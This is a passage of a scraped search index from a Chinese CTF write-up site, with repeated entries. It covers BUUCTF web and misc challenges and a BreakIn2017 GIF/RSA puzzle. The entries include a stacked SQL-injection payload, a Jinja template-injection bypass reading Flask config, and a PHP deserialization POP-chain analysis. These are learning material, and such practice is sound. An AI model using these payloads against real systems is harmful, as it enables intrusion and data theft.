$this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)){ @copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img();}else{ $this->error('Forbidden type!', url('../index'));} } else{ $this->error('Unknow file type!', url('../index')); } } upload_img \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c $this->ext \u4e3atrue\u5c31\u4f1a\u5c06\u6587\u4ef6\u6539\u540d\uff0c\u800c $this->filename_tmp \u548c $this->filename \u90fd\u53ef\u4ee5\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u76f4\u63a5\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u9664\u6cd5\u8fd9\u4e2a upload_img \u51fd\u6570 \u53ef\u4ee5\u5229\u7528\u7684\u70b9\u81ea\u7136\u662fcookie\u4e2d\u7684\u53cd\u5e8f\u5217\u5316 \u627e\u5230\u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u901a\u8fc7\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u53ef\u4ee5\u89e6\u53d1 __call \u7136\u540e $this->{$name} \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u65f6\u53ef\u4ee5\u89e6\u53d1 __get \u90a3\u4e48\u5bfb\u627e\u89e6\u53d1\u65b9\u5f0f\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6 web/controller/Register.php \uff0c\u5173\u952e\u90e8\u5206\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Register extends Controller { public $checker; public $registed; public function __construct() { $this->checker=new Index(); } public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } \u5728\u8fd9\u4e2a\u7c7b\u4e2d\u6700\u540e\u9500\u6bc1\u7684\u65f6\u5019\u4f1a\u8c03\u7528 $this->checker\u7684index \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c06 $this->checker \u8986\u76d6\u4e3a\u7c7bProfile\uff0c\u90a3\u4e48\u52bf\u5fc5\u5728\u8c03\u7528index()\u65b9\u6cd5\u65f6\uff0c\u4f1a\u89e6\u53d1call\u51fd\u6570\uff1a 1 2 3 4 5 6 public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u800c\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f1a\u89e6\u53d1 $this->index ,\u6210\u529f\u5c1d\u8bd5\u8c03\u7528\u7c7bProfile\u4e2d\u4e0d\u5b58\u5728\u7684\u5bf9\u8c61\uff0c\u4e8e\u662f\u53ef\u89e6\u53d1__get\u9b54\u6cd5\u65b9\u6cd5\uff0c\u4ece\u800c\u53d8\u6210 return $this->except['index']; \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u6784\u9020\u5e8f\u5217\u5316\u65f6\uff0c\u5c06except\u8d4b\u503c\u4e3a\u6570\u7ec4\uff0c\u5982\u4e0b\uff1a 1 public $except=array('index'=>'upload_img'); \u4e0d\u8fc7\u8fd9\u9898\u8bd5\u4e86\u597d\u591a\u6b21\u8fd8\u662f\u6ca1\u6210\u529f \u5e08\u5085\u7684 \u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684 \u53c2\u8003 \u00b6 \u53c2\u8003 BUUCTF FLAG","title":"BUUCTF"},{"location":"writeup/BUUCTF/#buuctf","text":"","title":"BUUCTF"},{"location":"writeup/BUUCTF/#_1","text":"\u6709\u8fc7\u6ee4\uff1a sqlmap \u53ef\u4ee5\u629b\u51fa\u6570\u636e\u5e93\u540d \u4f46\u662f\u8868\u540d\u6ca1\u6cd5\u5217\u51fa \u5806\u53e0\u6ce8\u5165 get 1' or 1=1 1'; show databases; # 1'; show tables# 1'; show columns from 1919810931114514# \u6709\u4e00\u4e2aflag\u7684\u5b57\u6bb5\u4f46\u662f\u4f60\u67e5\u4e0d\u51fa\u6765 \u63a5\u4e0b\u6765\u770b words \u4ed6\u65e2\u7136\u6ca1\u8fc7\u6ee4 alert \u548c rename\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u628a\u8868\u6539\u4e2a\u540d\u5b57\uff0c\u518d\u7ed9\u5217\u6539\u4e2a\u540d\u5b57\u5462\u3002 \u5148\u628a words \u6539\u540d\u4e3a words1\uff0c\u518d\u628a\u8fd9\u4e2a\u6570\u5b57\u8868\u6539\u540d\u4e3a words\uff0c\u7136\u540e\u628a\u65b0\u7684 words \u91cc\u7684 flag \u5217\u6539\u4e3a id \uff08\u907f\u514d\u4e00\u5f00\u59cb\u65e0\u6cd5\u67e5\u8be2\uff09\u3002 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u76f4\u63a5\u67e5\u8be2\u51fa flag \u4e86\u3002 1 2 3 4 .\u6784\u9020 payload \u5982\u4e0b\uff0c\u7136\u540e\u8bbf\u95ee\uff0c\u770b\u5230\u8fd9\u4e2a\u770b\u6765\u5c31\u6267\u884c\u5230\u6700\u540e\u4e00\u4e2a\u8bed\u53e5\u4e86\u3002\uff08\u6539\u8868\u540d\u90a3\u91cc\u76f4\u63a5\u4ece pma \u62f7\u4e86\u4e00\u4e2a\u8bed\u53e5\u8fc7\u6765\u6539- -\uff09 /?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;# /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# \u7136\u540eflag\u5c31\u51fa\u6765\u4e86","title":"\u968f\u4fbf\u6ce8"},{"location":"writeup/BUUCTF/#flag","text":"\u4e00\u5f20\u56fe\u7247 zsteg \u5de5\u5177\u5206\u6790\uff1a \u6709\u63d0\u793azip\u6587\u4ef6 \u63d0\u53d6\u51fa\u6765 zsteg 42011487927629132.png -E b1,rgb,lsb,xy > out \u5c1d\u8bd5\u89e3\u538b\u63d0\u53d6\u51fa\u6765\u7684\u95ee\u9898\u63d0\u793a\u62a5\u9519 \u4e00\u822c\u7528winrar\u89e3\u538b\u7f29\u9519\u8bef\u7684\u90fd\u53ef\u4ee5\u75287z\u89e3\u538b\u7f29 \u7136\u540e\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a elf \u683c\u5f0f\u7684\u6587\u4ef6 \u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230flag","title":"FLAG"},{"location":"writeup/BUUCTF/#_2","text":"\u76f4\u63a5\u4e0a zsteg \u5de5\u5177","title":"\u955c\u5b50\u91cc\u9762\u7684\u4e16\u754c"},{"location":"writeup/BUUCTF/#ningen-misc","text":"\u6709\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u4f46\u662f\u6ca1\u6709\u7206\u7834\u51fa\u5bc6\u7801","title":"ningen |MISC"},{"location":"writeup/BUUCTF/#rar-misc","text":"\u5b66\u4e60\u4e00\u4e9b\u5982\u4f55\u7206\u7834\u538b\u7f29\u5305 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u957f\u5ea6\u4e3a\u591a\u5c11\u4e86 \u4f46\u662f\u7206\u7834\u633a\u6162\u7684\uff0c\u627e\u4e86\u4e00\u4e2a\u6ce8\u518c\u7801 **ARCHPRP-GSVMT-66892-GKVMB-52992** \u4e0d\u8fc7\u8fd8\u662f\u5f88\u6162\u662f\u4e3a\u5565\uff1f\uff1f","title":"rar | MISC"},{"location":"writeup/BUUCTF/#shrine-web","text":"\u5728BUUCTF\u4e0a\u627e\u5230\u4e86\u8fd9\u9898\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) \u7531\u4e8e\u77e5\u9053\u4e86\u601d\u8def\u5229\u7528\u8d77\u6765\u4e5f\u5f88\u7b80\u5355\u4e86 1 url_for.__globals__.current_app.config \u5c31\u53ef\u4ee5\u4e86","title":"shrine | web"},{"location":"writeup/BUUCTF/#misc","text":"\u4f3c\u4e4e\u5c31\u662fbugku\u7684\u4e00\u9053\u9898 \u4e3b\u8981\u662f\u8fd9\u4e32\u7f16\u7801\u5982\u4f55\u5904\u7406 \u5148\u8f6c\u6362\u4e3aASCII\u7801 \u7136\u540e\u7528notepad++\u6253\u5f00\u66ff\u6362\u6389 (,) \u66ff\u6362\u7684\u90a3\u4e2a\u4ec0\u4e48\u90fd\u4e0d\u586b\u5c31\u884c kali\u4e2d\u4f7f\u7528 gnuplot \u753b\u56fe plot \"aaa.txt\" \u6211\u7528WSL\u5931\u8d25\u4e86","title":"\u6885\u82b1\u9999\u81ea\u82e6\u5bd2\u6765 | MISC"},{"location":"writeup/BUUCTF/#flag-misc","text":"\u56fe\u7247\u91cc\u9762\u6709\u4e1c\u897f \u4e0d\u77e5\u9053\u4e3a\u5565\u538b\u7f29\u5305\u91cc\u7684\u5185\u5bb9\u76f4\u63a5\u88ab\u641e\u51fa\u6765\u4e86\uff0c\u672c\u6765\u8fd8\u4ee5\u4e3a\u662f\u660e\u6587\u653b\u51fb\u7684 \u7136\u540estrings\u627e\u4e00\u4e0b\uff0c\u89e3\u7801\u51d1\u9f50flag flag{N7F5_AD5_i5_funny!}","title":"\u9762\u5177\u4e0b\u7684flag | MISC"},{"location":"writeup/BUUCTF/#webshell-misc","text":"\u7528d\u76fe\u626b\u63cf\u5c31\u884c \u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u77e5\u9053flag\u5728\u54ea\u3002\u3002 \u4e0d\u8fc7\u8ba4\u8bc6\u4e86D\u76fe\u8fd9\u4e2a\u597d\u5de5\u5177","title":"webshell | MISC"},{"location":"writeup/BUUCTF/#misc_1","text":"binwalk\uff0cstrings\uff0cforemost\u90fd\u8bd5\u4e86\u4e00\u904d\u90fd\u6ca1\u6548\u679c\u3002\u3002 \u539f\u6765\u662f\u8def\u7531\u5668\u7684\u4e1c\u4e1c \u53bb\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a\u5de5\u5177 flag\u5c31\u662f\u7528\u6237\u540d","title":"\u8377\u5170\u3002\u3002\u6570\u636e\u6cc4\u9732 | MISC"},{"location":"writeup/BUUCTF/#misc_2","text":"\u76f4\u63a5\u5bfc\u51faHTTP \u7136\u540e\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u56fe\u7247\u85cf\u5f97\u6bd4\u8f83\u6df1 \u53c2\u8003","title":"\u6570\u636e\u5305\u4e2d\u7684\u7ebf\u7d22 | MISC"},{"location":"writeup/BUUCTF/#upload-web","text":"\u8fd9\u662fqwb\u7684\u4e00\u9053\u9898\u76ee\uff0c\u91cd\u70b9\u8003\u5bdfpop\u94fe\u7684\u6784\u9020\uff0c\u7531\u4e8e\u81ea\u5df1tc\u5bfc\u81f4\u6ca1\u80fd\u641e\u51fa\u6765 \u53c2\u8003\u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684\u6587\u7ae0\u5206\u6790\u4e00\u6ce2 \u5728 web/controller/Profile.php \u770b\u5230\u5173\u952e\u51fd\u6570\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public function upload_img(){ if($this->checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; $this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)){ @copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img();}else{ $this->error('Forbidden type!', url('../index'));} } else{ $this->error('Unknow file type!', url('../index')); } } upload_img \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c $this->ext \u4e3atrue\u5c31\u4f1a\u5c06\u6587\u4ef6\u6539\u540d\uff0c\u800c $this->filename_tmp \u548c $this->filename \u90fd\u53ef\u4ee5\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u76f4\u63a5\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u9664\u6cd5\u8fd9\u4e2a upload_img \u51fd\u6570 \u53ef\u4ee5\u5229\u7528\u7684\u70b9\u81ea\u7136\u662fcookie\u4e2d\u7684\u53cd\u5e8f\u5217\u5316 \u627e\u5230\u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u901a\u8fc7\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u53ef\u4ee5\u89e6\u53d1 __call \u7136\u540e $this->{$name} \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u65f6\u53ef\u4ee5\u89e6\u53d1 __get \u90a3\u4e48\u5bfb\u627e\u89e6\u53d1\u65b9\u5f0f\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6 web/controller/Register.php \uff0c\u5173\u952e\u90e8\u5206\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Register extends Controller { public $checker; public $registed; public function __construct() { $this->checker=new Index(); } public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } \u5728\u8fd9\u4e2a\u7c7b\u4e2d\u6700\u540e\u9500\u6bc1\u7684\u65f6\u5019\u4f1a\u8c03\u7528 $this->checker\u7684index \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c06 $this->checker \u8986\u76d6\u4e3a\u7c7bProfile\uff0c\u90a3\u4e48\u52bf\u5fc5\u5728\u8c03\u7528index()\u65b9\u6cd5\u65f6\uff0c\u4f1a\u89e6\u53d1call\u51fd\u6570\uff1a 1 2 3 4 5 6 public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u800c\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f1a\u89e6\u53d1 $this->index ,\u6210\u529f\u5c1d\u8bd5\u8c03\u7528\u7c7bProfile\u4e2d\u4e0d\u5b58\u5728\u7684\u5bf9\u8c61\uff0c\u4e8e\u662f\u53ef\u89e6\u53d1__get\u9b54\u6cd5\u65b9\u6cd5\uff0c\u4ece\u800c\u53d8\u6210 return $this->except['index']; \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u6784\u9020\u5e8f\u5217\u5316\u65f6\uff0c\u5c06except\u8d4b\u503c\u4e3a\u6570\u7ec4\uff0c\u5982\u4e0b\uff1a 1 public $except=array('index'=>'upload_img'); \u4e0d\u8fc7\u8fd9\u9898\u8bd5\u4e86\u597d\u591a\u6b21\u8fd8\u662f\u6ca1\u6210\u529f \u5e08\u5085\u7684 \u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684","title":"upload| web"},{"location":"writeup/BUUCTF/#_3","text":"\u53c2\u8003 BUUCTF FLAG","title":"\u53c2\u8003"},{"location":"writeup/BreakIn2017/","text":"BreakIn2017 WP \u00b6 Mysterious GIF |MISC \u00b6 \u4f7f\u7528binwalk\u80fd\u5f97\u5230\u4fe1\u606f: 1 2 3 4 5 6 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 GIF image data, version \"89a\", 440 x 608 2670386 0x28BF32 Zip archive data, at least v1.0 to extract, compressed size: 112890, uncompressed size: 112890, name: temp.zip 2783320 0x2A7858 End of Zip archive 2783420 0x2A78BC End of Zip archive \u7528 binwalk -Me \u53ef\u4ee5\u63d0\u53d6\u51fa\u6587\u4ef6 \u5b66\u4e60\u4f7f\u7528\u4e00\u4e0b identify \u547d\u4ee4\u63d0\u53d6\u4fe1\u606f %c \u662f\u63d0\u53d6\u5143\u6570\u636e\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise$ identify -format \"%s %c\\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 2 67384f79337335593546563177434b3736367532574c775672574d49554a47316a4444725276595049635135557143703545445143696f524d4763555a456732 3 75766c3134324c44424161654f4c7a464d3465324a637a532b307238356d5052724353786a4c4b4c614c774949516e5a58497058535552562f776a6877575231 4 664a474738512b7563454170615873634e435546343462506d344850434a2f306d7244435457482f59324350564a6b4e6b2b6f305637564f74484b734d4c344e 5 434e414a483434572f4952774a6e744e572b4e3848726770526b467567686d4e6a63776c456b7274554b4731735243792f2f57687544756e5632706853525176 6 486f74425a76796441674d424141454367674542414a79614e336d6c6b756e772b617137704b5561677636437a6442477964394a78447941706b314b374f4938 7 54426873464d2f33744246654131592f41762b7568434c727967726b4279652f6963372f2b30356f3853392b65674d6b52584e484b41757952336752696b7759 8 7678454b634a676a5a5a4c524656794159372f6c477634774e42683362495044664631446739737a596e6b774948396c4c454679656d4d3734416941596c6371 9 6456645a49452f6271325a344a4f307439484367485a4e6651374a645266656a4e4a51565955443031517535644d744f523465494d6462576b68625658773254 10 45304837785178746a7754367a557270714576764f376533464845734249583635565258524c6276394f6f61794a786352715838654a6b5269344c2f597a6f34 11 4b5470456d6b64754a4c58734677743361715154626a5a48584f6c5454344e45647348327030547343414543675945412f653162737a4f3061312b6342614451 12 6a514f2b50763942734a464442336f314c477555484d4e53384644706e334a3436556b59796b353276496130763454636a715353484e4976585730544445556b 13 624e4641314870557856786c7730426965656838426733486658795142685876645444376b306c73446d4d456f3455504b59533644356359577972776864356e 14 4344304c72786562674f373552784c35514549452b34435649516b4367594541337638522f584b52564a50453461456567377051347554766346786a454e4e65 15 787866364b34787059344c6639636c49766465635268433274314864522b7853756c552f52536152727a4863773378672b4c31754f3073317435533766336e75 16 3361696849586b636747537158435a3156487a426d65433430545673664179627337714a30785936543571384d6e78324f62355a336c49477579686a65566174 17 4649493253647a324a2f55436759454174654131357a516f6a53504e482b62676d62424e717465763247556a536f374932556b777243316e4559515334636266 18 5064444364643066684d6444585534766e2b66575539686b58706d4b7043592b416363626c56554e744e4d4b6649423453484d78716a426961386f31616e5a35 19 726b6e6f5638576d4a4f50645a6259666478422f4b4432454434444243464756494c79417975657731506657436f64586969502f5a356a67742b6b4367594541 20 727378716f61306f316f3975695237752b48735835494e6f5854394f4f475933715144576a55526e61435779774d756a525979355a774b363930416f6f4c5253 21 744e555633334b3453416868384b7153714f6830652b34636b5762354170666c38634b3561362b76383854303958384141645935504247335465622b7673357a 22 54704d75626c54434b4a773259617a4754385579564e38666635334e4f3951426f4533686d45796f642f4543675941396b307879434a7a6376654b6478727936 23 706a51786b39465a7a3341744570316f635635566f776167562b4f4e657a2f4863634638474a4f384244716c5036586b634c5574736e70367459526545494349 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d \u731c\u6d4b\u51fa\u662f16\u8fdb\u5236\u7f16\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230\uff1a 1 \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u79c1\u94a5\uff0c\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u89e3\u5bc6enc\u6587\u4ef6 \u6ca1\u6709\u4ed4\u7ec6\u5ba1\u67e5binwalk\u63d0\u53d6\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u5176\u5b9e\u6709\u8fd9\u4e48\u4e00\u5806\u6587\u4ef6\uff1a \u6240\u4ee5\u904d\u5386\u8fd9\u4e9b\u6587\u4ef6\u7528\u79c1\u94a5\u89e3\u5bc6\u518d\u5c06\u5185\u5bb9\u4fdd\u5b58\u5230\u56fe\u7247\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise/_Question.gif.extracted/_temp.zip.extracted$ for i in `ls` > do > openssl rsautl -decrypt -inkey Question.txt -in $i >> flag.jpg > done RSA operation error 140493738283456:error:0D0680A8:asn1 encoding routines:asn1_check_tlen:wrong tag:../crypto/asn1/tasn_dec.c:1129: 140493738283456:error:0D06C03A:asn1 encoding routines:asn1_d2i_ex_primitive:nested asn1 error:../crypto/asn1/tasn_dec.c:693: 140493738283456:error:0D08303A:asn1 encoding routines:asn1_template_noexp_d2i:nested asn1 error:../crypto/asn1/tasn_dec.c:626:Field=n, Type=RSA 140493738283456:error:04093004:rsa routines:old_rsa_priv_decode:RSA lib:../crypto/rsa/rsa_ameth.c:72: 140493738283456:error:0406506C:rsa routines:rsa_ossl_private_decrypt:data greater than mod len:../crypto/rsa/rsa_ossl.c:401: pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise/_Question.gif.extracted/_temp.zip.extracted$ \u8fd9\u65f6\u5019\u5c31\u5f97\u5230\u4e86 flag openssl \u7684\u7528\u6cd5\uff0c rsautl \u6807\u660e\u662f\u7528\u4ec0\u4e48\u7b97\u6cd5 inkey \u6307\u660e\u5bc6\u94a5 -in \u8868\u793a\u8f93\u5165\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u901a\u8fc7\u5faa\u73af\u904d\u5386 ls \u7684\u7ed3\u679c\u5f97\u5230\u6bcf\u4e2a\u6587\u4ef6\u540d -out \u6307\u660e\u8f93\u51fa\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u7528\u91cd\u5b9a\u5411\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684\u8f93\u51fa\u4e3a\u6807\u51c6\u8f93\u51fa \u8fd8\u6709\u4e00\u4e2a\u5751\uff1a RSA\u7684\u79c1\u94a5\u6587\u4ef6\u683c\u5f0f\uff1a\uff08\u8fd9\u4e2a\u6211\u662f\u53c2\u7167\u6211.ssh\u76ee\u5f55\u4e0b\u5b58\u653e\u7684\u79c1\u94a5\u6765\u770b\u7684 1 \u7ee7\u7eed\u53c2\u8003\u7684wp\u505a\u51fa\u6765\u4e86 \u539f\u59cbwp\u4e0d\u8fc7\u6ca1\u770b\u61c2\u4e4b\u540e\u7684\u4e00\u6b65 TODO\uff1a\u5982\u4f55\u5c06 identify \u8f93\u51fa\u7684\u5185\u5bb9\u8fdb\u884c\u6574\u7406\uff08\u7528python\u6216\u8005Linux\u547d\u4ee4\u884c format \u53c2\u6570\u7684\u5177\u4f53\u542b\u4e49","title":"BreakIn2017 WP"},{"location":"writeup/BreakIn2017/#breakin2017-wp","text":"","title":"BreakIn2017 WP"},{"location":"writeup/BreakIn2017/#mysterious-gif-misc","text":"\u4f7f\u7528binwalk\u80fd\u5f97\u5230\u4fe1\u606f: 1 2 3 4 5 6 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 GIF image data, version \"89a\", 440 x 608 2670386 0x28BF32 Zip archive data, at least v1.0 to extract, compressed size: 112890, uncompressed size: 112890, name: temp.zip 2783320 0x2A7858 End of Zip archive 2783420 0x2A78BC End of Zip archive \u7528 binwalk -Me \u53ef\u4ee5\u63d0\u53d6\u51fa\u6587\u4ef6 \u5b66\u4e60\u4f7f\u7528\u4e00\u4e0b identify \u547d\u4ee4\u63d0\u53d6\u4fe1\u606f %c \u662f\u63d0\u53d6\u5143\u6570\u636e\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise$ identify -format \"%s %c\\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 2 67384f79337335593546563177434b3736367532574c775672574d49554a47316a4444725276595049635135557143703545445143696f524d4763555a456732 3 75766c3134324c44424161654f4c7a464d3465324a637a532b307238356d5052724353786a4c4b4c614c774949516e5a58497058535552562f776a6877575231 4 664a474738512b7563454170615873634e435546343462506d344850434a2f306d7244435457482f59324350564a6b4e6b2b6f305637564f74484b734d4c344e 5 434e414a483434572f4952774a6e744e572b4e3848726770526b467567686d4e6a63776c456b7274554b4731735243792f2f57687544756e5632706853525176 6 486f74425a76796441674d424141454367674542414a79614e336d6c6b756e772b617137704b5561677636437a6442477964394a78447941706b314b374f4938 7 54426873464d2f33744246654131592f41762b7568434c727967726b4279652f6963372f2b30356f3853392b65674d6b52584e484b41757952336752696b7759 8 7678454b634a676a5a5a4c524656794159372f6c477634774e42683362495044664631446739737a596e6b774948396c4c454679656d4d3734416941596c6371 9 6456645a49452f6271325a344a4f307439484367485a4e6651374a645266656a4e4a51565955443031517535644d744f523465494d6462576b68625658773254 10 45304837785178746a7754367a557270714576764f376533464845734249583635565258524c6276394f6f61794a786352715838654a6b5269344c2f597a6f34 11 4b5470456d6b64754a4c58734677743361715154626a5a48584f6c5454344e45647348327030547343414543675945412f653162737a4f3061312b6342614451 12 6a514f2b50763942734a464442336f314c477555484d4e53384644706e334a3436556b59796b353276496130763454636a715353484e4976585730544445556b 13 624e4641314870557856786c7730426965656838426733486658795142685876645444376b306c73446d4d456f3455504b59533644356359577972776864356e 14 4344304c72786562674f373552784c35514549452b34435649516b4367594541337638522f584b52564a50453461456567377051347554766346786a454e4e65 15 787866364b34787059344c6639636c49766465635268433274314864522b7853756c552f52536152727a4863773378672b4c31754f3073317435533766336e75 16 3361696849586b636747537158435a3156487a426d65433430545673664179627337714a30785936543571384d6e78324f62355a336c49477579686a65566174 17 4649493253647a324a2f55436759454174654131357a516f6a53504e482b62676d62424e717465763247556a536f374932556b777243316e4559515334636266 18 5064444364643066684d6444585534766e2b66575539686b58706d4b7043592b416363626c56554e744e4d4b6649423453484d78716a426961386f31616e5a35 19 726b6e6f5638576d4a4f50645a6259666478422f4b4432454434444243464756494c79417975657731506657436f64586969502f5a356a67742b6b4367594541 20 727378716f61306f316f3975695237752b48735835494e6f5854394f4f475933715144576a55526e61435779774d756a525979355a774b363930416f6f4c5253 21 744e555633334b3453416868384b7153714f6830652b34636b5762354170666c38634b3561362b76383854303958384141645935504247335465622b7673357a 22 54704d75626c54434b4a773259617a4754385579564e38666635334e4f3951426f4533686d45796f642f4543675941396b307879434a7a6376654b6478727936 23 706a51786b39465a7a3341744570316f635635566f776167562b4f4e657a2f4863634638474a4f384244716c5036586b634c5574736e70367459526545494349 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d \u731c\u6d4b\u51fa\u662f16\u8fdb\u5236\u7f16\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230\uff1a 1 \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u79c1\u94a5\uff0c\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u89e3\u5bc6enc\u6587\u4ef6 \u6ca1\u6709\u4ed4\u7ec6\u5ba1\u67e5binwalk\u63d0\u53d6\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u5176\u5b9e\u6709\u8fd9\u4e48\u4e00\u5806\u6587\u4ef6\uff1a \u6240\u4ee5\u904d\u5386\u8fd9\u4e9b\u6587\u4ef6\u7528\u79c1\u94a5\u89e3\u5bc6\u518d\u5c06\u5185\u5bb9\u4fdd\u5b58\u5230\u56fe\u7247\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise/_Question.gif.extracted/_temp.zip.extracted$ for i in `ls` > do > openssl rsautl -decrypt -inkey Question.txt -in $i >> flag.jpg > done RSA operation error 140493738283456:error:0D0680A8:asn1 encoding routines:asn1_check_tlen:wrong tag:../crypto/asn1/tasn_dec.c:1129: 140493738283456:error:0D06C03A:asn1 encoding routines:asn1_d2i_ex_primitive:nested asn1 error:../crypto/asn1/tasn_dec.c:693: 140493738283456:error:0D08303A:asn1 encoding routines:asn1_template_noexp_d2i:nested asn1 error:../crypto/asn1/tasn_dec.c:626:Field=n, Type=RSA 140493738283456:error:04093004:rsa 